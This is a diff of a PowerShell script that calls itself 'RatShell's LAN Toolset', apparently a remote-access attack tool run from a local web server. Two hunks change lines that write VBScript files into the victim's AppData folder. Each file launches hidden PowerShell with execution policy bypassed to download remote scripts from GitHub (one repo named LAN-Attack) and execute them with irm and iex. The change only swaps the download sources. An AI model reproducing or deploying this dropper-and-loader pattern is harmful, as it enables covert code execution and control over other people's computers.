@@ -320,7 +320,7 @@ while ($webServer.IsListening) {
     $tobat = @'
     Set WshShell = WScript.CreateObject("WScript.Shell")
     WScript.Sleep 200
-    WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/GIF-Play.ps1 | iex", 0, True
+    WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/Art-Fakt/LAN-Attack/refs/heads/main/Scripts/GIF-Play.ps1 | iex", 0, True
 '@
     $pth = "$env:APPDATA\Microsoft\Windows\1010.vbs"
     $tobat | Out-File -FilePath $pth -Force
@@ -338,7 +338,7 @@ while ($webServer.IsListening) {
     $tobat = @'
     Set WshShell = WScript.CreateObject("WScript.Shell")
     WScript.Sleep 200
-    WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/wallpaper.ps1 | iex", 0, True
+    WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/Art-Fakt/LAN-Attack/refs/heads/main/Scripts/wallpaper.ps1 | iex", 0, True
 '@
     $pth = "$env:APPDATA\Microsoft\Windows\1019.vbs"
     $tobat | Out-File -FilePath $pth -Force
@@ -588,4 +588,5 @@ if ($Option -eq '5'){Write-Host "Closing RatShell's LAN Toolset.."}
 $webServer.Stop()
 Write-Host "Server Stopped!" -ForegroundColor Green
 Sleep 1
+
 
